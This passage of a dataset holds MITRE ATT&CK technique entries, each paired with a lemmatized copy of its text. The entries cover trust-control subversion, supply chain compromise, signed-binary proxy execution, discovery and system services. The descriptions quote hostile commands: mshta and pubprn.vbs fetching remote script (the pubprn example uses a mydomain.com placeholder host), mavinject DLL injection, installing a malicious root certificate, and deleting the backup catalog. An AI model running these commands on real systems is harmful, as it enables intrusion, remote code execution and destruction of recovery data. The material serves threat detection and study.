policy allow legitimately sign code execute system adversary hijack sip trust provider component mislead operating system application control tool classify malicious code sign modify dll funcname registry value hash mismatch likely occur invalidate signature hash return function match value compute file modify dll funcname registry value hijack previously mention cryptsipdllgetsigneddatamsg function registry value redirect suitable export function present dll avoid requirement drop execute new file disk modify dll function registry value provider guid point dll provide trust provider finalpolicy function decode parse signature check majority trust decision similar hijack sip cryptsipdllverifyindirectdata function value redirect suitable export function present dll maliciously craft dll implementation trust provider complex note hijack possible modify registry dll search order hijacking hijack sip trust provider component enable persistent code execution malicious component invoke application perform code signing signature validation
T1553.004,Subvert Trust Controls: Install Root Certificate,"Adversaries may install a root certificate on a compromised system to avoid warnings when connecting to adversary controlled web servers. Root certificates are used in public key cryptography to identify a root certificate authority (CA). When a root certificate is installed, the system or application will trust certificates in the root's chain of trust that have been signed by the root certificate. Certificates are commonly used for establishing secure TLS/SSL communications within a web browser. When a user attempts to browse a website that presents a certificate that is not trusted an error message will be displayed to warn the user of the security risk. Depending on the security settings, the browser may not allow the user to establish a connection to the website.Installation of a root certificate on a compromised system would give an adversary a way to degrade the security of that system. Adversaries have used this technique to avoid security warnings prompting users when compromised systems connect over HTTPS to adversary controlled web servers that spoof legitimate websites in order to collect login credentials.Atypical root certificates have also been pre-installed on systems by the manufacturer or in the software supply chain and were used in conjunction with malware/adware to provide Adversary-in-the-Middle capability for intercepting information transmitted over secure TLS/SSL communications.Root certificates (and their associated chains) can also be cloned and reinstalled. Cloned certificate chains will carry many of the same metadata characteristics of the source and can be used to sign malicious code that may then bypass signature validation tools (ex: Sysinternals, antivirus, etc.) used to block execution and/or uncover artifacts of Persistence.In macOS, the Ay MaMi malware uses /usr/bin/security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain /path/to/malicious/cert to install a malicious certificate as a trusted root certificate into the system keychain.",adversary install root certificate compromised system avoid warning connect adversary control web server root certificate public key cryptography identify root certificate authority root certificate instal system application trust certificate root chain trust sign root certificate certificate commonly establish secure tls ssl communication web browser user attempt browse website present certificate trust error message display warn user security risk depend security setting browser allow user establish connection website installation root certificate compromise system adversary way degrade security system adversary technique avoid security warning prompt user compromise system connect https adversary control web server spoof legitimate website order collect login credential atypical root certificate pre instal system manufacturer software supply chain conjunction malware adware provide adversary middle capability intercept information transmit secure tls ssl communication root certificate associate chain clone reinstall clone certificate chain carry metadata characteristic source sign malicious code bypass signature validation tool ex sysinternal antivirus etc block execution uncover artifact persistence macos ay mami malware use bin security add trusted cert trustroot keychain malicious cert install malicious certificate trust root certificate system keychain
T1553.005,Subvert Trust Controls: Mark-of-the-Web Bypass,"Adversaries may abuse specific file formats to subvert Mark-of-the-Web (MOTW) controls. In Windows, when files are downloaded from the Internet, they are tagged with a hidden NTFS Alternate Data Stream (ADS) named Zone.Identifier with a specific value known as the MOTW.Adversaries may abuse container files such as compressed/archive (.arj, .gzip) and/or disk image (.iso, .vhd) file formats to deliver malicious payloads that may not be tagged with MOTW. Container files downloaded from the Internet will be marked with MOTW but the files within may not inherit the MOTW after the container files are extracted and/or mounted. MOTW is a NTFS feature and many container files do not support NTFS alternative data streams. After a container file is extracted and/or mounted, the files contained within them may be treated as local files on disk and run without protections.",adversary abuse specific file format subvert mark web motw control windows file download internet tag hide ntfs alternate data stream ads name zone identifier specific value know abuse container file compressed archive disk image file format deliver malicious payload tag motw container file download internet mark motw file inherit motw container file extract mount motw ntfs feature container file support ntfs alternative data stream container file extract mount file contain treat local file disk run protection
T1553.006,Subvert Trust Controls: Code Signing Policy Modification,"Adversaries may modify code signing policies to enable execution of unsigned or self-signed code. Code signing provides a level of authenticity on a program from a developer and a guarantee that the program has not been tampered with. Security controls can include enforcement mechanisms to ensure that only valid, signed code can be run on an operating system. Some of these security controls may be enabled by default, such as Driver Signature Enforcement (DSE) on Windows or System Integrity Protection (SIP) on macOS.Adversaries may modify code signing policies in a number of ways, including through use of command-line or GUI utilities, Modify Registry, rebooting the computer in a debug/recovery mode, or by altering the value of variables in kernel memory.To gain access to kernel memory to modify variables related to signature checks, such as modifying g_CiOptions to disable Driver Signature Enforcement, adversaries may conduct Exploitation for Privilege Escalation using a signed, but vulnerable driver.",adversary modify code signing policy enable execution unsigned self sign code code signing provide level authenticity program developer guarantee program tamper security control include enforcement mechanism ensure valid sign code run operate system security control enable default driver signature enforcement dse windows system integrity protection sip modify code signing policy number way include use command line gui utility modify registry reboot computer debug recovery mode alter value variable kernel memory gain access kernel memory modify variable relate signature check modify disable driver signature enforcement adversary conduct exploitation privilege escalation signed vulnerable driver
T1195,Supply Chain Compromise,"Adversaries may manipulate products or product delivery mechanisms prior to receipt by a final consumer for the purpose of data or system compromise.Supply chain compromise can take place at any stage of the supply chain including:Manipulation of development tools Manipulation of a development environment Manipulation of source code repositories (public or private) Manipulation of source code in open-source dependencies Manipulation of software update/distribution mechanisms Compromised/infected system images (multiple cases of removable media infected at the factory) Replacement of legitimate software with modified versions Sales of modified/counterfeit products to legitimate distributors Shipment interdictionWhile supply chain compromise can impact any component of hardware or software, adversaries looking to gain execution have often focused on malicious additions to legitimate software in software distribution or update channels.",adversary manipulate product product delivery mechanism prior receipt final consumer purpose data system compromise supply chain compromise place stage supply chain include manipulation development tool manipulation development environment manipulation source code repository public private manipulation source code open source dependency manipulation software update distribution mechanism compromise infect system image multiple case removable medium infect factory replacement legitimate software modify version sale modify counterfeit product legitimate distributor shipment interdictionwhile supply chain compromise impact component hardware software adversary look gain execution focus malicious addition legitimate software software distribution update channel
T1195.001,Supply Chain Compromise: Compromise Software Dependencies and Development Tools,Adversaries may manipulate software dependencies and development tools prior to receipt by a final consumer for the purpose of data or system compromise. Applications often depend on external software to function properly. Popular open source projects that are used as dependencies in many applications may be targeted as a means to add malicious code to users of the dependency. Targeting may be specific to a desired victim set or may be distributed to a broad set of consumers but only move on to additional tactics on specific victims.,adversary manipulate software dependency development tool prior receipt final consumer purpose datum system compromise application depend external software function properly popular open source project dependency application target means add malicious code user dependency targeting specific desire victim set distribute broad set consumer additional tactic specific victim
T1195.002,Supply Chain Compromise: Compromise Software Supply Chain,"Adversaries may manipulate application software prior to receipt by a final consumer for the purpose of data or system compromise. Supply chain compromise of software can take place in a number of ways, including manipulation of the application source code, manipulation of the update/distribution mechanism for that software, or replacing compiled releases with a modified version.Targeting may be specific to a desired victim set or may be distributed to a broad set of consumers but only move on to additional tactics on specific victims.",adversary manipulate application software prior receipt final consumer purpose datum system compromise supply chain compromise software place number way include manipulation application source code manipulation update distribution mechanism software replace compile release modify version targeting specific desire victim set distribute broad set consumer additional tactic specific victim
T1195.003,Supply Chain Compromise: Compromise Hardware Supply Chain,"Adversaries may manipulate hardware components in products prior to receipt by a final consumer for the purpose of data or system compromise. By modifying hardware or firmware in the supply chain, adversaries can insert a backdoor into consumer networks that may be difficult to detect and give the adversary a high degree of control over the system. Hardware backdoors may be inserted into various devices, such as servers, workstations, network infrastructure, or peripherals.",adversary manipulate hardware component product prior receipt final consumer purpose data system compromise modify hardware firmware supply chain adversary insert backdoor consumer network difficult detect adversary high degree control system hardware backdoor insert device server workstation network infrastructure peripheral
T1218,System Binary Proxy Execution,"Adversaries may bypass process and/or signature-based defenses by proxying execution of malicious content with signed, or otherwise trusted, binaries. Binaries used in this technique are often Microsoft-signed files, indicating that they have been either downloaded from Microsoft or are already native in the operating system. Binaries signed with trusted digital certificates can typically execute on Windows systems protected by digital signature validation. Several Microsoft signed binaries that are default on Windows installations can be used to proxy execution of other files or commands.Similarly, on Linux systems adversaries may abuse trusted binaries such as split to proxy execution of malicious commands.",adversary bypass process signature base defense proxye execution malicious content sign trust binary binary technique microsoft sign file indicate download microsoft native operate system binary sign trust digital certificate typically execute windows system protect digital signature validation microsoft sign binary default windows installation proxy execution file command similarly linux system adversary abuse trust binary split proxy execution malicious command
T1218.001,System Binary Proxy Execution: Compiled HTML File,"Adversaries may abuse Compiled HTML files (.chm) to conceal malicious code. CHM files are commonly distributed as part of the Microsoft HTML Help system. CHM files are compressed compilations of various content such as HTML documents, images, and scripting/web related programming languages such VBA, JScript, Java, and ActiveX. A custom CHM file containing embedded payloads could be delivered to a victim then triggered by User Execution. CHM execution may also bypass application application control on older and/or unpatched systems that do not account for execution of binaries through hh.exe.",adversary abuse compile html file conceal malicious code chm file commonly distribute microsoft html help system chm file compress compilation content html document image scripting web relate programming language vba jscript java custom chm file contain embed payload deliver victim trigger user execution chm execution bypass application application control old unpatched system account execution binary
T1218.002,System Binary Proxy Execution: Control Panel,"Adversaries may abuse control.exe to proxy execution of malicious payloads. The Windows Control Panel process binary (control.exe) handles execution of Control Panel items, which are utilities that allow users to view and adjust computer settings.Control Panel items are registered executable (.exe) or Control Panel (.cpl) files, the latter are actually renamed dynamic-link library (.dll) files that export a CPlApplet function.Malicious Control Panel items can be delivered via Phishing campaigns Control Panel items, specifically CPL files, may also bypass application and/or file extension allow lists.Adversaries may also rename malicious DLL files (.dll) with Control Panel file extensions (.cpl) and register them to HKCU\Software\Microsoft\Windows\CurrentVersion\Control Panel\Cpls. Even when these registered DLLs do not comply with the CPL file specification and do not export CPlApplet functions, they are loaded and executed through its DllEntryPoint when Control Panel is executed. CPL files not exporting CPlApplet are not directly executable.",adversary abuse proxy execution malicious payload windows control panel process binary handle execution control panel item utility allow user view adjust computer setting control panel item register executable control panel file actually rename dynamic link library file export cplapplet function malicious control panel item deliver phishing campaign control panel item specifically cpl file bypass application file extension allow list adversary rename malicious dll file control panel file extension register register dll comply cpl file specification export cplapplet function load execute dllentrypoint control panel execute cpl file export cplapplet directly executable
T1218.003,System Binary Proxy Execution: CMSTP,Adversaries may abuse CMSTP to proxy execution of malicious code. The Microsoft Connection Manager Profile Installer (CMSTP.exe) is a command-line program used to install Connection Manager service profiles. CMSTP.exe accepts an installation information file (INF) as a parameter and installs a service profile leveraged for remote access connections.Adversaries may supply CMSTP.exe with INF files infected with malicious commands. This execution may also bypass AppLocker and other application control defenses since CMSTP.exe is a legitimate binary that may be signed by Microsoft.CMSTP.exe can also be abused to Bypass User Account Control and execute arbitrary commands from a malicious INF through an auto-elevated COM interface.,adversary abuse cmstp proxy execution malicious code microsoft connection manager profile installer command line program install connection manager service profile accept installation information file inf parameter install service profile leverage remote access connection adversary supply inf file infect malicious command execution bypass applocker application control defense legitimate binary sign abuse bypass user account control execute arbitrary command malicious inf auto elevate com interface
T1218.004,System Binary Proxy Execution: InstallUtil,Adversaries may use InstallUtil to proxy execution of code through a trusted Windows utility. InstallUtil is a command-line utility that allows for installation and uninstallation of resources by executing specific installer components specified in .NET binaries. The InstallUtil binary may also be digitally signed by Microsoft and located in the .NET directories on a Windows system: C:\Windows\Microsoft.NET\Framework\v\InstallUtil.exe and C:\Windows\Microsoft.NET\Framework64\v\InstallUtil.exe.InstallUtil may also be used to bypass application control through use of attributes within the binary that execute the class decorated with the attribute,adversary use installutil proxy execution code trusted windows utility installutil command line utility allow installation uninstallation resource execute specific installer component specify binary installutil binary digitally sign microsoft locate directory windows system installutil bypass application control use attribute binary execute class decorate attribute
T1218.005,System Binary Proxy Execution: Mshta,"Adversaries may abuse mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript through a trusted Windows utility. There are several examples of different types of threats leveraging mshta.exe during initial compromise and for execution of code Mshta.exe is a utility that executes Microsoft HTML Applications (HTA) files. Files may be executed by mshta.exe through an inline script: mshta vbscript:Close(Execute(""GetObject(""""script:httpssct"""")""))They may also be executed directly from URLs: mshta httphtaMshta.exe can be used to bypass application control solutions that do not account for its potential use. Since mshta.exe executes outside of the Internet Explorer's security context, it also bypasses browser security settings.",adversary abuse proxy execution malicious file javascript vbscript trust windows utility example different type threat leverage initial compromise execution code utility execute microsoft html applications hta file file execute inline script mshta vbscript execute directly url mshta bypass application control solution account potential use execute outside internet explorer security context bypass browser security setting
T1218.007,System Binary Proxy Execution: Msiexec,Adversaries may abuse msiexec.exe to proxy execution of malicious payloads. Msiexec.exe is the command-line utility for the Windows Installer and is thus commonly associated with executing installation packages (.msi). The Msiexec.exe binary may also be digitally signed by Microsoft.Adversaries may abuse msiexec.exe to launch local or network accessible MSI files. Msiexec.exe can also execute DLLs.,adversary abuse proxy execution malicious payload command line utility windows installer commonly associate execute installation package binary digitally sign microsoft adversary abuse launch local network accessible msi file execute dll
T1218.008,System Binary Proxy Execution: Odbcconf,"Adversaries may abuse odbcconf.exe to proxy execution of malicious payloads. Odbcconf.exe is a Windows utility that allows you to configure Open Database Connectivity (ODBC) drivers and data source names. The Odbcconf.exe binary may be digitally signed by Microsoft.Adversaries may abuse odbcconf.exe to bypass application control solutions that do not account for its potential abuse. Similar to Regsvr32, odbcconf.exe has a REGSVR flag that can be misused to execute DLLs (ex: odbcconf.exe /S /A &lbrace;REGSVR ""C:\Users\Public\file.dll""&rbrace;).",adversary abuse proxy execution malicious payload windows utility allow configure open database connectivity odbc driver data source name binary digitally sign microsoft adversary abuse bypass application control solution account potential abuse similar regsvr flag misuse execute dll ex
T1218.009,System Binary Proxy Execution: Regsvcs/Regasm,Adversaries may abuse Regsvcs and Regasm to proxy execution of code through a trusted Windows utility. Regsvcs and Regasm are Windows command-line utilities that are used to register .NET Component Object Model (COM) assemblies. Both are binaries that may be digitally signed by Microsoft. Both utilities may be used to bypass application control through use of attributes within the binary to specify code that should be run before registration or unregistration:,adversary abuse regsvcs regasm proxy execution code trust windows utility regsvcs regasm windows command line utility register component object model com assembly binary digitally sign microsoft utility bypass application control use attribute binary specify code run registration unregistration
T1218.010,System Binary Proxy Execution: Regsvr32,"Adversaries may abuse Regsvr32.exe to proxy execution of malicious code. Regsvr32.exe is a command-line program used to register and unregister object linking and embedding controls, including dynamic link libraries (DLLs), on Windows systems. The Regsvr32.exe binary may also be signed by Microsoft. Malicious usage of Regsvr32.exe may avoid triggering security tools that may not monitor execution of, and modules loaded by, the regsvr32.exe process because of allowlists or false positives from Windows using regsvr32.exe for normal operations. Regsvr32.exe can also be used to specifically bypass application control using functionality to load COM scriptlets to execute DLLs under user permissions. Since Regsvr32.exe is network and proxy aware, the scripts can be loaded by passing a uniform resource locator (URL) to file on an external Web server as an argument during invocation. This method makes no changes to the Registry as the COM object is not actually registered, only executed. Regsvr32.exe can also be leveraged to register a COM Object used to establish persistence via Component Object Model Hijacking.",adversary abuse proxy execution malicious code command line program register unregister object linking embedding control include dynamic link library dll windows system binary sign microsoft malicious usage avoid trigger security tool monitor execution module load process allowlist false positive windows normal operation specifically bypass application control functionality load com scriptlet execute dll user permission network proxy aware script load pass uniform resource locator url file external web server argument invocation method make change registry com object actually register execute leverage register com object establish persistence component object model hijacking
T1218.011,System Binary Proxy Execution: Rundll32,"Adversaries may abuse rundll32.exe to proxy execution of malicious code. Using rundll32.exe, vice executing directly (i.e. Shared Modules), may avoid triggering security tools that may not monitor execution of the rundll32.exe process because of allowlists or false positives from normal operations. Rundll32.exe is commonly associated with executing DLL payloads (ex: rundll32.exe {DLLname, DLLfunction}).Rundll32.exe can also be used to execute Control Panel Item files (.cpl) through the undocumented shell32.dll functions Control_RunDLL and Control_RunDLLAsUser. Double-clicking a .cpl file also causes rundll32.exe to execute. Rundll32 can also be used to execute scripts such as JavaScript. This can be done using a syntax similar to this: rundll32.exe javascript:""..\mshtml,RunHTMLApplication "";document.write();GetObject(""script:httpsAdversaries may also attempt to obscure malicious code from analysis by abusing the manner in which rundll32.exe loads DLL function names. As part of Windows compatibility support for various character sets, rundll32.exe will first check for wide/Unicode then ANSI character-supported functions before loading the specified function (e.g., given the command rundll32.exe ExampleDLL.dll, ExampleFunction, rundll32.exe would first attempt to execute ExampleFunctionW, or failing that ExampleFunctionA, before loading ExampleFunction). Adversaries may therefore obscure malicious code by creating multiple identical exported function names and appending W and/or A to harmless ones. DLL functions can also be exported and executed by an ordinal number (ex: rundll32.exe file.dll,#1).Additionally, adversaries may use Masquerading techniques (such as changing DLL file names, file extensions, or function names) to further conceal execution of a malicious payload.",adversary abuse proxy execution malicious code vice execute directly share module avoid trigger security tool monitor execution process allowlist false positive normal operation commonly associate execute dll payload ex dllname execute control panel item file undocumented function double click file cause execute execute script javascript syntax similar runhtmlapplication httpsadversarie attempt obscure malicious code analysis abuse manner load dll function name windows compatibility support character set check wide unicode ansi character support function load specify function give command examplefunction attempt execute examplefunctionw fail examplefunctiona load examplefunction adversary obscure malicious code create multiple identical export function name append w harmless one dll function export execute ordinal number ex adversary use masquerade technique change dll file name file extension function name conceal execution malicious payload
T1218.012,System Binary Proxy Execution: Verclsid,"Adversaries may abuse verclsid.exe to proxy execution of malicious code. Verclsid.exe is known as the Extension CLSID Verification Host and is responsible for verifying each shell extension before they are used by Windows Explorer or the Windows Shell.Adversaries may abuse verclsid.exe to execute malicious payloads. This may be achieved by running verclsid.exe /S /C {CLSID}, where the file is referenced by a Class ID (CLSID), a unique identification number used to identify COM objects. COM payloads executed by verclsid.exe may be able to perform various malicious actions, such as loading and executing COM scriptlets (SCT) from remote servers (similar to Regsvr32). Since the binary may be signed and/or native on Windows systems, proxying execution via verclsid.exe may bypass application control solutions that do not account for its potential abuse.",adversary abuse proxy execution malicious code know extension clsid verification host responsible verify shell extension windows explorer windows shell adversary abuse execute malicious payload achieve run clsid file reference class id clsid unique identification number identify com object com payload execute able perform malicious action load execute com scriptlet sct remote server similar binary sign native windows system proxye execution bypass application control solution account potential abuse
T1218.013,System Binary Proxy Execution: Mavinject,"Adversaries may abuse mavinject.exe to proxy execution of malicious code. Mavinject.exe is the Microsoft Application Virtualization Injector, a Windows utility that can inject code into external processes as part of Microsoft Application Virtualization (App-V).Adversaries may abuse mavinject.exe to inject malicious DLLs into running processes (i.e. Dynamic-link Library Injection), allowing for arbitrary code execution (ex. C:\Windows\system32\mavinject.exe PID /INJECTRUNNING PATH_DLL). Since mavinject.exe may be digitally signed by Microsoft, proxying execution via this method may evade detection by security products because the execution is masked under a legitimate process. In addition to Dynamic-link Library Injection, Mavinject.exe can also be abused to perform import descriptor injection via its /HMODULE command-line parameter (ex. mavinject.exe PID /HMODULE=BASE_ADDRESS PATH_DLL ORDINAL_NUMBER). This command would inject an import table entry consisting of the specified DLL into the module at the given base address.",adversary abuse proxy execution malicious code microsoft application virtualization injector windows utility inject code external process microsoft application virtualization app abuse inject malicious dll run process dynamic link library injection allow arbitrary code execution ex pid digitally sign microsoft proxye execution method evade detection security product execution mask legitimate process addition dynamic link library injection abuse perform import descriptor injection command line parameter ex pid command inject import table entry consist specify dll module give base address
T1218.014,System Binary Proxy Execution: MMC,"Adversaries may abuse mmc.exe to proxy execution of malicious .msc files. Microsoft Management Console (MMC) is a binary that may be signed by Microsoft and is used in several ways in either its GUI or in a command prompt.For example, mmc C:\Users\foo\admintools.msc /a will open a custom, saved console msc file in author mode. Another common example is mmc gpedit.msc, which will open the Group Policy Editor application window. Adversaries may use MMC commands to perform malicious tasks. For example, mmc wbadmin.msc delete catalog -quiet deletes the backup catalog on the system (i.e. Inhibit System Recovery) without prompts to the user (Note: wbadmin.msc may only be present by default on Windows Server operating systems).Adversaries may also abuse MMC to execute malicious .msc files. For example, adversaries may first create a malicious registry Class Identifier (CLSID) subkey, which uniquely identifies a Component Object Model class object.",adversary abuse proxy execution malicious file microsoft management console mmc binary sign microsoft way gui command prompt example mmc open custom save console msc file author mode common example mmc open group policy editor application window adversary use mmc command perform malicious task example mmc delete catalog delete backup catalog system inhibit system recovery prompt user note present default windows server operate abuse mmc execute malicious file example adversary create malicious registry class identifier clsid subkey uniquely identify component object model class object
T1082,System Information Discovery,"An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information from System Information Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.Tools such as Systeminfo can be used to gather detailed system information. If running with privileged access, a breakdown of system data can be gathered through the systemsetup configuration tool on macOS. As an example, adversaries with user-level access can execute the df -aH command to obtain currently mounted disks and associated freely available space. Adversaries may also leverage a Network Device CLI on network devices to gather detailed system information (e.g. show version).Infrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs. Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine.",adversary attempt detailed information operate system hardware include version patch hotfixe service pack architecture adversary use information system information discovery automate discovery shape follow behavior include adversary fully infect target attempt specific action tool systeminfo gather detailed system information run privileged access breakdown system datum gather systemsetup configuration tool macos example adversary user level access execute df command obtain currently mount disk associate freely available space adversary leverage network device cli network device gather detailed system information service iaas cloud provider aws gcp azure allow access instance virtual machine information api successful authenticate api call return datum operate system platform status particular instance model view virtual machine
T1614,System Location Discovery,"Adversaries may gather information in an attempt to calculate the geographical location of a victim host. Adversaries may use the information from System Location Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.Adversaries may attempt to infer the location of a system using various system checks, such as time zone, keyboard layout, and/or language settings.Adversaries may also attempt to infer the location of a victim host using IP addressing, such as via online geolocation IP-lookup services.",adversary gather information attempt calculate geographical location victim host adversary use information system location discovery automate discovery shape follow behavior include adversary fully infect target attempt specific action adversary attempt infer location system system check time zone keyboard layout language setting adversary attempt infer location victim host ip addressing online geolocation ip lookup service
T1614.001,System Location Discovery: System Language Discovery,"Adversaries may attempt to gather information about the system language of a victim in order to infer the geographical location of that host. This information may be used to shape follow-on behaviors, including whether the adversary infects the target and/or attempts specific actions. This decision may be employed by malware developers and operators to reduce their risk of attracting the attention of specific law enforcement agencies or prosecution/scrutiny from other entities.There are various sources of data an adversary could use to infer system language, such as system defaults and keyboard layouts. Specific checks will vary based on the target and/or adversary, but may involve behaviors such as Query Registry and calls to Native API functions. For example, on a Windows system adversaries may attempt to infer the language of a system by querying the registry key HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Nls\Language or parsing the outputs of Windows API functions GetUserDefaultUILanguage, GetSystemDefaultUILanguage, GetKeyboardLayoutList and GetUserDefaultLangID.On a macOS or Linux system, adversaries may query locale to retrieve the value of the $LANG environment variable.",adversary attempt gather information system language victim order infer geographical location host information shape follow behavior include adversary infect target attempt specific action decision employ malware developer operator reduce risk attract attention specific law enforcement agency prosecution scrutiny entity source datum adversary use infer system language system default keyboard layout specific check vary base target adversary involve behavior query registry call native api function example windows system adversary attempt infer language system query registry key parse output windows api function getuserdefaultuilanguage getsystemdefaultuilanguage getkeyboardlayoutlist macos linux system adversary query locale retrieve value lang environment variable
T1016,System Network Configuration Discovery,"Adversaries may look for details about the network configuration and settings, such as IP and/or MAC addresses, of systems they access or through information discovery of remote systems. Several operating system administration utilities exist that can be used to gather this information. Examples include Arp, ipconfig/ifconfig, nbtstat, and route.Adversaries may also leverage a Network Device CLI on network devices to gather information about configurations and settings, such as IP addresses of configured interfaces and static/dynamic routes (e.g. show ip route, show ip interface).Adversaries may use the information from System Network Configuration Discovery during automated discovery to shape follow-on behaviors, including determining certain access within the target network and what actions to do next.",adversary look detail network configuration setting ip mac address system access information discovery remote system operate system administration utility exist gather information example include arp ipconfig ifconfig nbtstat route adversary leverage network device cli network device gather information configuration setting ip address configure interface static dynamic route ip route ip use information system network configuration discovery automate discovery shape follow behavior include determine certain access target network action
T1016.001,System Network Configuration Discovery: Internet Connection Discovery,"Adversaries may check for Internet connectivity on compromised systems. This may be performed during automated discovery and can be accomplished in numerous ways such as using Ping, tracert, and GET requests to websites.Adversaries may use the results and responses from these requests to determine if the system is capable of communicating with their C2 servers before attempting to connect to them. The results may also be used to identify routes, redirectors, and proxy servers.",adversary check internet connectivity compromised system perform automate discovery accomplish numerous way ping tracert request website adversary use result response request determine system capable communicate server attempt connect result identify route redirector proxy server
T1049,System Network Connections Discovery,"Adversaries may attempt to get a listing of network connections to or from the compromised system they are currently accessing or from remote systems by querying for information over the network. An adversary who gains access to a system that is part of a cloud-based environment may map out Virtual Private Clouds or Virtual Networks in order to determine what systems and services are connected. The actions performed are likely the same types of discovery techniques depending on the operating system, but the resulting information may include details about the networked cloud environment relevant to the adversary's goals. Cloud providers may have different ways in which their virtual networks operate. Similarly, adversaries who gain access to network devices may also perform similar discovery activities to gather information about connected systems and services.Utilities and commands that acquire this information include netstat, ""net use,"" and ""net session"" with Net. In Mac and Linux, netstat and lsof can be used to list current connections. who -a and w can be used to show which users are currently logged in, similar to ""net session"". Additionally, built-in features native to network devices and Network Device CLI may be used (e.g. show ip sockets, show tcp brief).",adversary attempt listing network connection compromised system currently access remote system query information network adversary gain access system cloud base environment map virtual private clouds virtual networks order determine system service connect action perform likely type discovery technique depend operate system result information include detail networked cloud environment relevant adversary goal cloud provider different way virtual network operate similarly adversary gain access network device perform similar discovery activity gather information connect system service utility command acquire information include netstat net use net session net mac linux netstat lsof list current connection w user currently log similar net session additionally build feature native network device network device cli ip socket tcp brief
T1033,System Owner/User Discovery,"Adversaries may attempt to identify the primary user, currently logged in user, set of users that commonly uses a system, or whether a user is actively using the system. They may do this, for example, by retrieving account usernames or by using OS Credential Dumping. The information may be collected in a number of different ways using other Discovery techniques, because user and username details are prevalent throughout a system and include running process ownership, file/directory ownership, session information, and system logs. Adversaries may use the information from System Owner/User Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.Various utilities and commands may acquire this information, including whoami. In macOS and Linux, the currently logged in user can be identified with w and who. On macOS the dscl . list /Users | grep -v '_' command can also be used to enumerate user accounts. Environment variables, such as %USERNAME% and $USER, may also be used to access this information.On network devices, Network Device CLI commands such as show users and show ssh can be used to display users currently logged into the device.",adversary attempt identify primary user currently log user set user commonly use system user actively system example retrieve account username os credential dumping information collect number different way discovery technique user username detail prevalent system include run process ownership file directory ownership session information system log adversary use information system owner user discovery automate discovery shape follow behavior include adversary fully infect target attempt specific action utility command acquire information include whoami macos linux currently log user identify w macos dscl list grep command enumerate user account environment variable user access information network device network device cli command user ssh display user currently log device
T1216,System Script Proxy Execution,"Adversaries may use trusted scripts, often signed with certificates, to proxy the execution of malicious files. Several Microsoft signed scripts that have been downloaded from Microsoft or are default on Windows installations can be used to proxy execution of other files.",adversary use trust script sign certificate proxy execution malicious file microsoft sign script download microsoft default windows installation proxy execution file
T1216.001,System Script Proxy Execution: PubPrn,"Adversaries may use PubPrn to proxy execution of malicious remote files. PubPrn.vbs is a Visual Basic script that publishes a printer to Active Directory Domain Services. The script may be signed by Microsoft and is commonly executed through the Windows Command Shell via Cscript.exe. For example, the following code publishes a printer within the specified domain: cscript pubprn Printer1 LDAP://CN=Container1,DC=Domain1,DC=Com.Adversaries may abuse PubPrn to execute malicious payloads hosted on remote sites. To do so, adversaries may set the second script: parameter to reference a scriptlet file (.sct) hosted on a remote site. An example command is pubprn.vbs 127.0.0.1 script:https://mydomain.com/folder/file.sct. This behavior may bypass signature validation restrictions and application control solutions that do not account for abuse of this script.In later versions of Windows (10+), PubPrn.vbs has been updated to prevent proxying execution from a remote site. This is done by limiting the protocol specified in the second parameter to LDAP://, vice the script: moniker which could be used to reference remote code via HTTP(S).",adversary use pubprn proxy execution malicious remote file visual basic script publish printer active directory domain services script sign microsoft commonly execute windows command shell example following code publish printer specify domain cscript pubprn com adversary abuse pubprn execute malicious payload host remote site adversary set second script parameter reference scriptlet file host remote site example command script folder behavior bypass signature validation restriction application control solution account abuse script later version windows update prevent proxye execution remote site limit protocol specify second parameter vice script moniker reference remote code
T1007,System Service Discovery,"Adversaries may try to gather information about registered local system services. Adversaries may obtain information about services using tools as well as OS utility commands such as sc query, tasklist /svc, systemctl --type=service, and net start.Adversaries may use the information from System Service Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.",adversary try gather information register local system service adversary obtain information service tool os utility command sc query tasklist systemctl service net start adversary use information system service discovery automate discovery shape follow behavior include adversary fully infect target attempt specific action
T1569,System Services,"Adversaries may abuse system services or daemons to execute commands or programs. Adversaries can execute malicious content by interacting with or creating services either locally or remotely. Many services are set to run at boot, which can aid in achieving persistence (Create or Modify System Process), but adversaries can also abuse services for one-time or temporary execution.",adversary abuse system service daemon execute command program adversary execute malicious content interact create service locally remotely service set run boot aid achieve persistence create modify system process adversary abuse service time temporary execution
T1569.001,System Services: Launchctl,"Adversaries may abuse launchctl to execute commands or programs. Launchctl interfaces with launchd, the service management framework for macOS. Launchctl supports taking subcommands on the command-line, interactively, or even redirected from standard input.Adversaries use launchctl to execute commands and programs as Launch Agents or Launch Daemons. Common subcommands include: launchctl load,launchctl unload, and launchctl start. Adversaries can use scripts or manually run the commands launchctl load -w ""%s/Library/LaunchAgents/%s"" or /bin/launchctl load to execute Launch Agents or Launch Daemons.",adversary abuse launchctl execute command program launchctl interface launchd service management framework macos launchctl support take subcommand command line interactively redirect standard input adversary use launchctl execute command program launch agents launch daemons common subcommand include launchctl load launchctl unload launchctl start adversary use script manually run command launchctl load s library launchctl load execute launch agents launch daemons
T1569.002,System Services: Service Execution,Adversaries may abuse the Windows service control manager to execute malicious commands or payloads. The Windows service control manager (services.exe) is an interface to manage and manipulate services. The service control manager is accessible to users via GUI components as well as system utilities such as sc.exe and Net.PsExec can also be used to execute commands or payloads via a temporary Windows service created through the service control manager API. Tools such as PsExec and sc.exe can accept remote servers as arguments and may be used to conduct remote execution.Adversaries may leverage these mechanisms to execute malicious content. This can be done by either executing a new or modified service. This technique is the execution used in conjunction with Windows Service during service persistence or privilege escalation.,adversary abuse windows service control manager execute malicious command payload windows service control manager interface manage manipulate service service control manager accessible user gui component system utility net psexec execute command payload temporary windows service create service control manager api tool psexec accept remote server argument conduct remote execution adversary leverage mechanism execute malicious content execute new modified service technique execution conjunction windows service service persistence privilege escalation
